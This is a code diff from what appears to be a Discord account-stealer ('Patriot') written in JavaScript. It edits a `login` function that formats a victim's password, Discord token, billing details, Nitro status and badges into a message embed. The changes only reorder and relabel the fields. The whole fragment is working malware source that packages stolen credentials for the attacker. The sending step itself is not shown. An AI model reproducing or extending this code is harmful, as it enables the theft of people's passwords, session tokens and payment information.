@@ -749,8 +749,23 @@ const login = async (email, password, token) => {
       {
         color: config.embed_color,
         fields: [{
-          name: "<:lxckk:1032868282153316353> Password",
-          value: `\`${password}\``,
+          name: "<:patriot_idd:1032868508574416896> **Token**",
+          value: `\`${token}\``,
+          inline: false
+        },
+        {
+          name: "<a:patriot_gng:1032868284699250731> Badges",
+          value: `\`${badges}\``,
+          inline: true
+        },
+        {
+          name: "<a:ptr_billing:1032868278823038987> Billing",
+          value: `\`${billing}\``,
+          inline: true
+        },
+        {
+          name: "<:Patriot_Nitro:1032868403117051944> Nitro",
+          value: `\`${nitro}\``,
           inline: true
         },
         {
@@ -759,24 +774,9 @@ const login = async (email, password, token) => {
           inline: true
         },
         {
-          name: "<:Patriot_Nitro:1032868403117051944> Nitro",
-          value: `\`${nitro}\``,
-          inline: false
-        }, 
-        {
-          name: "<a:ptr_billing:1032868278823038987> Billing",
-          value: `\`${billing}\``,
+          name: "<:lxckk:1032868282153316353> Password",
+          value: `\`${password}\``,
           inline: true
-        },
-        {
-          name: "<a:patriot_gng:1032868284699250731> Badges",
-          value: `\`${badges}\``,
-          inline: false
-        },
-        {
-          name: "<:patriot_guilds:1032868286532173904> Token",
-          value: `\`${token}\``,
-          inline: false
         },
       ],
         author: {
